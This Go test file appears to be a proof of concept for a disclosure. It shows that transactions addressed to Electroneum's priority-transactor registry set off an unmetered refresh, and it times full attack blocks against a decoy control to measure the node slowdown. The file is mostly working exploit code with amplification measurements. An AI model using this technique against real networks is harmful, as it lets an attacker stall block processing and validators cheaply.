package core

import (
	"crypto/ecdsa"
	"fmt"
	"math/big"
	"strings"
	"testing"
	"time"

	"github.com/electroneum/electroneum-sc/accounts/abi"
	"github.com/electroneum/electroneum-sc/common"
	"github.com/electroneum/electroneum-sc/consensus/ethash"
	"github.com/electroneum/electroneum-sc/contracts/prioritytransactors"
	"github.com/electroneum/electroneum-sc/core/rawdb"
	"github.com/electroneum/electroneum-sc/core/types"
	"github.com/electroneum/electroneum-sc/core/vm"
	"github.com/electroneum/electroneum-sc/crypto"
	"github.com/electroneum/electroneum-sc/params"
)

// registryAddr is where the PoC deploys the priority-transactor registry.
var registryAddr = common.HexToAddress("0x92cdf1fc0e54d3150f100265ae2717b0689660ee")

// decoyAddr holds a byte-for-byte identical copy of the registry contract at an
// address the chain config does NOT designate as the registry. Sending the
// control block here means both blocks execute exactly the same contract code
// with exactly the same gas; the only difference left is the unmetered refresh.
var decoyAddr = common.HexToAddress("0x00000000000000000000000000000000c0ffee01")

// buildRegistryReturnData ABI-encodes the return value of getTransactors() for
// n registered transactors, matching ETNPriorityTransactorsInterface exactly.
func buildRegistryReturnData(t *testing.T, n int) []byte {
	t.Helper()
	parsed, err := abi.JSON(strings.NewReader(prioritytransactors.ETNPriorityTransactorsInterfaceMetaData.ABI))
	if err != nil {
		t.Fatalf("abi: %v", err)
	}
	metas := make([]prioritytransactors.ETNPriorityTransactorsInterfaceTransactorMeta, 0, n)
	for i := 0; i < n; i++ {
		key, _ := crypto.GenerateKey()
		pub := crypto.FromECDSAPub(&key.PublicKey) // 65 bytes, 0x04-prefixed
		metas = append(metas, prioritytransactors.ETNPriorityTransactorsInterfaceTransactorMeta{
			IsGasPriceWaiver: i%2 == 0,
			PublicKey:        common.Bytes2Hex(pub),
			Name:             fmt.Sprintf("transactor-%d", i),
		})
	}
	out, err := parsed.Methods["getTransactors"].Outputs.Pack(metas)
	if err != nil {
		t.Fatalf("pack: %v", err)
	}
	return out
}

// registryBytecode builds runtime code that returns `blob` for any call.
// PUSH4 is used for the length/offset immediates so blobs above 64 KiB work.
//
//	PUSH4 len ; PUSH4 codeOffset ; PUSH1 0 ; CODECOPY ; PUSH4 len ; PUSH1 0 ; RETURN ; <blob>
func registryBytecode(blob []byte) []byte {
	const prologue = 21 // length of the instruction sequence below
	l := len(blob)
	be := func(v int) []byte {
		return []byte{byte(v >> 24), byte(v >> 16), byte(v >> 8), byte(v)}
	}
	code := []byte{0x63}
	code = append(code, be(l)...) // PUSH4 len
	code = append(code, 0x63)
	code = append(code, be(prologue)...) // PUSH4 codeOffset
	code = append(code, 0x60, 0x00)      // PUSH1 0 (destOffset)
	code = append(code, 0x39)            // CODECOPY
	code = append(code, 0x63)
	code = append(code, be(l)...)   // PUSH4 len
	code = append(code, 0x60, 0x00) // PUSH1 0
	code = append(code, 0xf3)       // RETURN
	if len(code) != prologue {
		panic(fmt.Sprintf("prologue mismatch: %d", len(code)))
	}
	return append(code, blob...)
}

// newAmpChain builds a chain whose genesis deploys the registry with n
// transactors, plus a funded attacker account.
func newAmpChain(t *testing.T, nTransactors int) (*BlockChain, *Genesis, *ecdsa.PrivateKey) {
	t.Helper()
	key, _ := crypto.GenerateKey()
	addr := crypto.PubkeyToAddress(key.PublicKey)

	cfg := *params.AllEthashProtocolChanges
	cfg.PriorityTransactorsContractAddress = registryAddr

	alloc := GenesisAlloc{
		addr: {Balance: new(big.Int).Mul(big.NewInt(1e18), big.NewInt(1e6))},
	}
	if nTransactors >= 0 {
		code := registryBytecode(buildRegistryReturnData(t, nTransactors))
		alloc[registryAddr] = GenesisAccount{Balance: big.NewInt(0), Code: code}
		// Identical code, non-registry address: the control.
		alloc[decoyAddr] = GenesisAccount{Balance: big.NewInt(0), Code: code}
	}

	gspec := &Genesis{Config: &cfg, Alloc: alloc, GasLimit: 30_000_000}
	db := rawdb.NewMemoryDatabase()
	gspec.MustCommit(db)

	chain, err := NewBlockChain(db, nil, gspec.Config, ethash.NewFaker(), vm.Config{}, nil, nil)
	if err != nil {
		t.Fatalf("chain: %v", err)
	}
	return chain, gspec, key
}

// measureBlock builds a block of nTx plain 21,000-gas transfers to `to`, then
// times StateProcessor.Process over it.
func measureBlock(t *testing.T, chain *BlockChain, gspec *Genesis, key *ecdsa.PrivateKey, to common.Address, nTx int) (time.Duration, uint64, types.Receipts) {
	t.Helper()
	signer := types.LatestSigner(gspec.Config)

	blocks, _ := GenerateChain(gspec.Config, chain.Genesis(), ethash.NewFaker(), chain.db, 1, func(i int, gen *BlockGen) {
		for j := 0; j < nTx; j++ {
			tx, err := types.SignTx(types.NewTransaction(
				uint64(j), to, big.NewInt(0), params.TxGas, gen.header.BaseFee, nil), signer, key)
			if err != nil {
				t.Fatalf("sign: %v", err)
			}
			gen.AddTx(tx)
		}
	})
	block := blocks[0]
	if got := len(block.Transactions()); got != nTx {
		t.Fatalf("block has %d txs, want %d", got, nTx)
	}

	statedb, err := chain.StateAt(chain.Genesis().Root())
	if err != nil {
		t.Fatalf("state: %v", err)
	}
	p := NewStateProcessor(gspec.Config, chain, ethash.NewFaker())

	// Best of N: block execution timing is noisy; the minimum is the closest
	// estimate of the real cost.
	best := time.Duration(1 << 62)
	var usedGas uint64
	var receipts types.Receipts
	for i := 0; i < 5; i++ {
		st, err := chain.StateAt(chain.Genesis().Root())
		if err != nil {
			t.Fatalf("state: %v", err)
		}
		start := time.Now()
		r, _, gas, err := p.Process(block, st, vm.Config{})
		elapsed := time.Since(start)
		if err != nil {
			t.Fatalf("process: %v", err)
		}
		if elapsed < best {
			best, usedGas, receipts = elapsed, gas, r
		}
	}
	_ = statedb
	return best, usedGas, receipts
}

// TestRegistryRefresh_UnmeteredAmplification measures the cost a node pays for a
// block full of transactions addressed to the priority-transactor registry.
//
// state_processor.go:162 refreshes the priority-transactor map after ANY
// transaction whose To equals the registry address -- no calldata required, no
// success required, no write to the registry required. The refresh runs
// GetPriorityTransactors, which re-parses the contract ABI and performs an
// evm.StaticCall with params.MaxGasLimit (2^63-1). None of that work is charged
// to the transaction, the block gas pool, or usedGas.
func TestRegistryRefresh_UnmeteredAmplification(t *testing.T) {
	const nTx = 400
	victim := decoyAddr

	fmt.Printf("\n=== UNMETERED REGISTRY REFRESH: %d txs of %d gas each ===\n", nTx, params.TxGas)
	fmt.Printf("  %-22s %-12s %-12s %-9s %s\n", "registry", "to-decoy", "to-registry", "factor", "gas (both)")

	for _, nTransactors := range []int{-1, 0, 16, 64, 256, 1024} {
		chain, gspec, key := newAmpChain(t, nTransactors)

		if nTransactors > 0 {
			// Guard against a broken harness: confirm the deployed registry really
			// resolves to nTransactors entries before trusting any timing.
			st, _ := chain.StateAt(chain.Genesis().Root())
			got := chain.GetPriorityTransactorsForState(chain.CurrentHeader(), st)
			if len(got) != nTransactors {
				t.Fatalf("harness broken: registry resolved %d transactors, want %d", len(got), nTransactors)
			}
		}
		baseline, baseGas, _ := measureBlock(t, chain, gspec, key, victim, nTx)
		attack, attackGas, rcpts := measureBlock(t, chain, gspec, key, registryAddr, nTx)

		label := fmt.Sprintf("%d transactors", nTransactors)
		if nTransactors < 0 {
			label = "not deployed"
		}
		fmt.Printf("  %-22s %-12s %-12s x%-8.1f %d\n",
			label, baseline.Round(time.Microsecond), attack.Round(time.Microsecond),
			float64(attack)/float64(baseline), attackGas)

		if attackGas != baseGas {
			t.Errorf("gas differs (%d vs %d) - the amplification would be metered", attackGas, baseGas)
		}
		if nTransactors == 64 {
			failed := 0
			for _, r := range rcpts {
				if r.Status == types.ReceiptStatusFailed {
					failed++
				}
			}
			fmt.Printf("    ^ triggering txs that FAILED (out of gas): %d/%d - the refresh runs anyway\n", failed, len(rcpts))
		}
		chain.Stop()
	}
	fmt.Println()
}

// TestRegistryRefresh_FullBlockImpact measures the cost of a FULL block of
// registry-addressed transactions, which is what an attacker actually sends.
//
// A 30,000,000-gas block holds 30e6/21000 = 1428 plain transfers. Every one of
// them is a 21,000-gas failed transfer, and every one forces a full unmetered
// registry re-read on every importing node.
//
// The reference points are the QBFT parameters: BlockPeriod 5s (target block
// interval) and RequestTimeoutSeconds 10s (round timeout).
func TestRegistryRefresh_FullBlockImpact(t *testing.T) {
	const blockGas = 30_000_000
	nTx := blockGas / int(params.TxGas) // 1428
	victim := decoyAddr

	fmt.Printf("\n=== FULL 30M-GAS BLOCK OF REGISTRY-ADDRESSED TRANSFERS ===\n")
	fmt.Printf("  %d txs x %d gas; QBFT BlockPeriod=5s, RequestTimeout=10s\n\n", nTx, params.TxGas)
	fmt.Printf("  %-18s %-12s %-14s %-9s %s\n", "registry", "to-decoy", "attack block", "factor", "vs 5s period")

	for _, nTransactors := range []int{16, 64, 256, 1024} {
		chain, gspec, key := newAmpChain(t, nTransactors)

		baseline, baseGas, _ := measureBlock(t, chain, gspec, key, victim, nTx)
		attack, attackGas, _ := measureBlock(t, chain, gspec, key, registryAddr, nTx)

		verdict := "-"
		if attack > 5*time.Second {
			verdict = "EXCEEDS BlockPeriod"
		} else if attack > time.Second {
			verdict = ">1s"
		}
		fmt.Printf("  %-18s %-12s %-14s x%-8.1f %s\n",
			fmt.Sprintf("%d transactors", nTransactors),
			baseline.Round(time.Millisecond), attack.Round(time.Millisecond),
			float64(attack)/float64(baseline), verdict)

		if attackGas != baseGas {
			t.Errorf("gas differs (%d vs %d)", attackGas, baseGas)
		}
		chain.Stop()
	}
	fmt.Printf("\n  Attacker cost: one block's worth of base fee. Every tx fails out of gas.\n")
	fmt.Printf("  The proposer pays this twice (miner/worker.go:953 refreshes again on top\n")
	fmt.Printf("  of the refresh already done inside core.ApplyTransaction).\n\n")
}
